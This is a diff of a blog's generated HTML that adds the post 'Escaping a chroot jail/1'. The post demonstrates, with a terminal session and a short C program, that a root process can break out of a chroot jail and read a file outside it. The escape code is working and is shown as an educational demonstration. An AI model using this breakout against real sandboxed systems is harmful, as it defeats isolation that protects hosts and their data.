@@ -5,7 +5,7 @@
 <!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
 <head>
   <meta charset="utf-8">
-  <title>PyTux</title>
+  <title>Escaping a chroot jail/1 - PyTux</title>
   <meta name="author" content="Filippo Valsorda">
 
   
@@ -18,7 +18,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   
-  <link rel="canonical" href="http://filosottile.github.com/">
+  <link rel="canonical" href="http://filosottile.github.com/escaping-a-chroot-jail-slash-1/">
   <link href="/favicon.png" rel="icon">
   <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
   <script src="/javascripts/modernizr-2.0.js"></script>
@@ -105,18 +105,13 @@ MathJax.Hub.Config({
 </nav>
   <div id="main">
     <div id="content">
-      <div class="blog-index">
+      <div>
+<article class="hentry" role="article">
   
-  
-  
-    
-    <article>
-      
   <header>
     
       
-        <!-- Now we're back to normal posts. Note the links used under href in both headers. -->
-        <h1 class="entry-title"><a href="/escaping-a-chroot-jail-slash-1/">Escaping a chroot jail/1</a></h1>
+        <h1 class="entry-title">Escaping a chroot jail/1</h1>
       
     
     
@@ -140,391 +135,185 @@ MathJax.Hub.Config({
   </header>
 
 
+  <div class="entry-content"><p>Everybody will tell you that a <a href="https://en.wikipedia.org/wiki/Chroot#Uses">chroot jail</a> (that is, making a process think that a directory is instead the root folder, and not letting it access or modify anything outside of that) is ineffective against a process with root privileges (UID 0). Let’s see why.</p>
+
+<!-- more -->
+
+<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+<span class="line-number">20</span>
+<span class="line-number">21</span>
+<span class="line-number">22</span>
+<span class="line-number">23</span>
+<span class="line-number">24</span>
+<span class="line-number">25</span>
+<span class="line-number">26</span>
+<span class="line-number">27</span>
+<span class="line-number">28</span>
+<span class="line-number">29</span>
+<span class="line-number">30</span>
+<span class="line-number">31</span>
+<span class="line-number">32</span>
+<span class="line-number">33</span>
+<span class="line-number">34</span>
+<span class="line-number">35</span>
+<span class="line-number">36</span>
+<span class="line-number">37</span>
+<span class="line-number">38</span>
+<span class="line-number">39</span>
+<span class="line-number">40</span>
+<span class="line-number">41</span>
+<span class="line-number">42</span>
+<span class="line-number">43</span>
+<span class="line-number">44</span>
+<span class="line-number">45</span>
+<span class="line-number">46</span>
+<span class="line-number">47</span>
+<span class="line-number">48</span>
+<span class="line-number">49</span>
+<span class="line-number">50</span>
+<span class="line-number">51</span>
+<span class="line-number">52</span>
+<span class="line-number">53</span>
+<span class="line-number">54</span>
+<span class="line-number">55</span>
+<span class="line-number">56</span>
+<span class="line-number">57</span>
+</pre></td><td class="code"><pre><code class=""><span class="line">$ echo 1337 | sudo tee /FLAG
+</span><span class="line">1337
+</span><span class="line">$ mkdir chroot
+</span><span class="line">$ cd chroot/
+</span><span class="line">$ mkdir bin etc lib var home
+</span><span class="line">$ ln -s lib lib64
+</span><span class="line">$ ldd /bin/sh
+</span><span class="line">    linux-vdso.so.1 =&gt;  (0x00007fffa9c83000)
+</span><span class="line">    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9a29106000)
+</span><span class="line">    /lib64/ld-linux-x86-64.so.2 (0x00007f9a294d8000)
+</span><span class="line">$ cp /bin/sh bin
+</span><span class="line">$ cp /lib/x86_64-linux-gnu/libc.so.6 lib
+</span><span class="line">$ cp /lib64/ld-linux-x86-64.so.2 lib
+</span><span class="line">$ tree
+</span><span class="line">.
+</span><span class="line">├── bin
+</span><span class="line">│   └── sh
+</span><span class="line">├── etc
+</span><span class="line">├── home
+</span><span class="line">├── lib
+</span><span class="line">│   ├── ld-linux-x86-64.so.2
+</span><span class="line">│   └── libc.so.6
+</span><span class="line">├── lib64 -&gt; lib
+</span><span class="line">└── var
+</span><span class="line">
+</span><span class="line">6 directories, 3 files
+</span><span class="line">$
+</span><span class="line">$ cat &gt; unchroot.c
+</span><span class="line">#include &lt;sys/stat.h&gt;
+</span><span class="line">#include &lt;unistd.h&gt;
+</span><span class="line">#include &lt;fcntl.h&gt;
+</span><span class="line">
+</span><span class="line">int main() {
+</span><span class="line">    int dir_fd, x;
+</span><span class="line">    setuid(0);
+</span><span class="line">    mkdir(".42", 0755);
+</span><span class="line">    dir_fd = open(".", O_RDONLY);
+</span><span class="line">    chroot(".42");
+</span><span class="line">    fchdir(dir_fd);
+</span><span class="line">    close(dir_fd);
+</span><span class="line">    for(x = 0; x &lt; 1000; x++) chdir("..");
+</span><span class="line">    chroot(".");
+</span><span class="line">    return execl("/bin/sh", "-i", NULL);
+</span><span class="line">}
+</span><span class="line">$ gcc -static -o unchroot unchroot.c
+</span><span class="line">$
+</span><span class="line">$ sudo chroot . /bin/sh
+</span><span class="line"># ls
+</span><span class="line">/bin/sh: 1: ls: not found
+</span><span class="line"># ./unchroot
+</span><span class="line"># ls
+</span><span class="line">bin    dev   home            lib         media  proc  sbin     sys  var
+</span><span class="line">boot   etc   initrd.img      lib64       mnt    root  selinux  tmp  vmlinuz
+</span><span class="line">cdrom  FLAG  initrd.img.old  lost+found  opt    run   srv      usr  vmlinuz.old
+</span><span class="line"># cat FLAG
+</span><span class="line">1337
+</span><span class="line">#</span></code></pre></td></tr></table></div></figure></notextile></div>
+</div>
+
   
-    <div class="entry-content"><p>Everybody will tell you that a <a href="https://en.wikipedia.org/wiki/Chroot#Uses">chroot jail</a> (that is, making a process think that a directory is instead the root folder, and not letting it access or modify anything outside of that) is ineffective against a process with root privileges (UID 0). Let’s see why.</p>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Filippo Valsorda</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-10-14T10:00:00-04:00" pubdate data-updated="true">Oct 14<span>th</span>, 2013</time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://filosottile.github.com/escaping-a-chroot-jail-slash-1/" data-via="FiloSottile" data-counturl="http://filosottile.github.com/escaping-a-chroot-jail-slash-1/" >Tweet</a>
+  
+  
+  <div class="g-plusone" data-size="medium"></div>
+  
+  
+  
+  <a href="http://news.ycombinator.com/submit" class="hn-share-button">Vote on HN</a>
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/instance-monkey-patching-in-python/" title="Previous Post: Instance monkey-patching in Python">&laquo; Instance monkey-patching in Python</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
 
 </div>
-    
-    
-      <footer>
-        <a rel="full-article" href="/escaping-a-chroot-jail-slash-1/">Read on &rarr;</a>
-      </footer>
-    
-  
 
-  
-
-
-    </article>
-    
-  
-    
-    <article>
-      
-  <header>
-    
-      
-        <!-- Now we're back to normal posts. Note the links used under href in both headers. -->
-        <h1 class="entry-title"><a href="/instance-monkey-patching-in-python/">Instance monkey-patching in Python</a></h1>
-      
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-10-07T00:19:00-04:00" pubdate data-updated="true">Oct 7<span>th</span>, 2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  
-
-  
-
-
-    </article>
-    
-  
-    
-    <article>
-      
-  <header>
-    
-      
-        <!-- Now we're back to normal posts. Note the links used under href in both headers. -->
-        <h1 class="entry-title"><a href="/dumping-the-ios-simulator-memory/">Dumping the iOS simulator memory</a></h1>
-      
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-09-12T18:26:00-04:00" pubdate data-updated="true">Sep 12<span>th</span>, 2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  
-
-  
-
-
-    </article>
-    
-  
-    
-    <article>
-      
-  <header>
-    
-      
-        <!-- Now we're back to normal posts. Note the links used under href in both headers. -->
-        <h1 class="entry-title"><a href="/a-bug-worth-4200%24/">A bug worth 4200$</a></h1>
-      
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-04-26T13:04:00-04:00" pubdate data-updated="true">Apr 26<span>th</span>, 2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  
-
-  
-
-
-    </article>
-    
-  
-    
-    <article>
-      
-  <header>
-    
-      
-        <!-- This defines how Octopress will use posts with external-url. -->
-        <h1 class="entry-title"><a class="external-link" href="https://www.recapthelaw.org/2013/04/02/two-recap-grants-awarded-in-memory-of-aaron-swartz/">Claimed a RECAP Aaron Swartz grant</a></h1>
-      
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-04-04T21:40:00-04:00" pubdate data-updated="true">Apr 4<span>th</span>, 2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  
-
-  
-    <footer>
-      <a class="permalink" href="/claimed-a-recap-aaron-swartz-grant/">Permalink</a>
-    </footer>
-  
-
-
-    </article>
-    
-  
-    
-    <article>
-      
-  <header>
-    
-      
-        <!-- Now we're back to normal posts. Note the links used under href in both headers. -->
-        <h1 class="entry-title"><a href="/offline-storage-on-a-rpi/">Offline storage on a RPi</a></h1>
-      
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-02-22T23:21:00-05:00" pubdate data-updated="true">Feb 22<span>nd</span>, 2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  
-
-  
-
-
-    </article>
-    
-  
-    
-    <article>
-      
-  <header>
-    
-      
-        <!-- This defines how Octopress will use posts with external-url. -->
-        <h1 class="entry-title"><a class="external-link" href="http://blog.wizpert.com/programming-help/">Programming isn&#8217;t always easy</a></h1>
-      
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-02-21T23:14:00-05:00" pubdate data-updated="true">Feb 21<span>st</span>, 2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  
-
-  
-    <footer>
-      <a class="permalink" href="/programming-isnt-always-easy/">Permalink</a>
-    </footer>
-  
-
-
-    </article>
-    
-  
-    
-    <article>
-      
-  <header>
-    
-      
-        <!-- Now we're back to normal posts. Note the links used under href in both headers. -->
-        <h1 class="entry-title"><a href="/decompressing-lempel-ziv-stac-in-python/">Decompressing Lempel-Ziv-Stac in Python</a></h1>
-      
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-01-29T12:06:00-05:00" pubdate data-updated="true">Jan 29<span>th</span>, 2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  
-
-  
-
-
-    </article>
-    
-  
-    
-    <article>
-      
-  <header>
-    
-      
-        <!-- Now we're back to normal posts. Note the links used under href in both headers. -->
-        <h1 class="entry-title"><a href="/why-mega-will-change-the-status-quo/">Why Mega WILL change the status quo</a></h1>
-      
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-01-19T19:23:00-05:00" pubdate data-updated="true">Jan 19<span>th</span>, 2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  
-
-  
-
-
-    </article>
-    
-  
-    
-    <article>
-      
-  <header>
-    
-      
-        <!-- Now we're back to normal posts. Note the links used under href in both headers. -->
-        <h1 class="entry-title"><a href="/archive-your-github-repo-and-data/">Archive your GitHub repo and data</a></h1>
-      
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-01-14T23:17:00-05:00" pubdate data-updated="true">Jan 14<span>th</span>, 2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  
-
-  
-
-
-    </article>
-    
-  
-  <div class="pagination">
-    
-      <a class="prev" href="/blog/page/2/">&larr; Older</a>
-    
-    <a href="/archives">Blog Archives</a>
-    
-  </div>
-</div>
 <aside class="sidebar">
   
     <section class="aboutme">
@@ -540,7 +329,7 @@ MathJax.Hub.Config({
   <h1>Coderwall<a href="https://coderwall.com/filosottile"><img alt="Endorse"
   src="http://api.coderwall.com/filosottile/endorsecount.png" /></a></h1>
   <ul id="cw_badges">
-    <li class="loading">Status updating&#8230;</li>
+    <li class="loading">Status updating...</li>
   </ul>
 
   <script type="text/javascript">
@@ -599,7 +388,7 @@ MathJax.Hub.Config({
 <section>
   <h1>GitHub Repos</h1>
   <ul id="gh_repos">
-    <li class="loading">Status updating&#8230;</li>
+    <li class="loading">Status updating...</li>
   </ul>
   
   <a href="https://github.com/FiloSottile">@FiloSottile</a> on GitHub
@@ -640,7 +429,7 @@ MathJax.Hub.Config({
 
 <section>
   <h1>My Pinboard</h1>
-  <ul id="pinboard_linkroll">Fetching linkroll&#8230;</ul>
+  <ul id="pinboard_linkroll">Fetching linkroll...</ul>
   <p><a href="http://pinboard.in/u:FiloSottile">My Pinboard Bookmarks &raquo;</a></p>
 </section>
 <script type="text/javascript">
@@ -660,6 +449,7 @@ MathJax.Hub.Config({
   
 </aside>
 
+
     </div>
   </div>
   <footer role="contentinfo"><p>
@@ -674,7 +464,10 @@ MathJax.Hub.Config({
       var disqus_shortname = 'pytux';
       
         
-        var disqus_script = 'count.js';
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://filosottile.github.com/escaping-a-chroot-jail-slash-1/';
+        var disqus_url = 'http://filosottile.github.com/escaping-a-chroot-jail-slash-1/';
+        var disqus_script = 'embed.js';
       
     (function () {
       var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
